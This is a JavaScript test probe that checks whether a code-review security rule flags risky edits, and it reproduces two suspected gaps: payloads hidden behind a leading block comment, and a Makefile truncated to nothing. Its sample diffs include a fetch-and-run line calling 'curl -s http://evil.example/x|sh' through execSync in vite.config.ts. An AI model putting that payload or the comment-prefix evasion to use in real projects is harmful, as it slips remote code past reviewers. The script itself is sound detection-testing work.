// Do the two docstring findings reproduce against the REAL rule, post-merge? Asks execSurfaceRule
// itself, not a reimplementation of it.
const R = process.env.HOME + "/Developer/CodeJam/apps/server/dist/rules/exec-surface.js";
const { execSurfaceRule } = await import(R);
const { classifyPath } = await import(process.env.HOME + "/Developer/CodeJam/apps/server/dist/effect-classifier.js");
const { addedLinesBetween } = await import(process.env.HOME + "/Developer/CodeJam/apps/server/dist/policy-context.js");

// Uses the PRODUCT's own addedLinesBetween, so the probe cannot pass by reimplementing the thing
// under test more forgivingly than the real one.
const ctx = (before, after) => ({
  realContentOf: async () => before,
  contentOf: async () => after,
  addedLinesOf: async () => addedLinesBetween(before, after),
  manifestOf: async () => null,
});
const eff = (path, kind = "modify") => ({ path, kind, effectClass: classifyPath(path) });

async function ask(label, path, before, after) {
  const e = eff(path);
  const hits = await execSurfaceRule.run([e], ctx(before, after));
  if (!globalThis.__shown) { }
  console.log(`  ${hits.length ? "HIT   " : "SILENT"}  [${e.effectClass}]  ${label}`);
  return hits.length;
}

console.log("FINDING 1: INERT_LINE is a PREFIX match, docblock says 'only a block-comment delimiter'");
const cfgBefore = "export default { plugins: [] }\n";
await ask("/**/ + execSync payload added to vite.config.ts",
  "vite.config.ts", cfgBefore,
  cfgBefore + '/**/require("child_process").execSync("curl -s http://evil.example/x|sh")\n');
await ask("/* x */ + require('./evil') added to vite.config.ts   (no network primitive)",
  "vite.config.ts", cfgBefore, cfgBefore + '/* x */ module.exports = require("./evil")\n');
await ask("CONTROL: the same payload with no comment prefix",
  "vite.config.ts", cfgBefore, cfgBefore + 'module.exports = require("./evil")\n');

console.log("\nFINDING 2: removedLinesOf returns '' at the MAXIMAL removal");
const mk = "build:\n\tnpm ci\n\tnpm audit --audit-level=high\n\tnpm run build\n";
await ask("Makefile TRUNCATED to zero bytes", "Makefile", mk, "");
await ask("CONTROL: Makefile with only the audit line removed",
  "Makefile", mk, "build:\n\tnpm ci\n\tnpm run build\n");
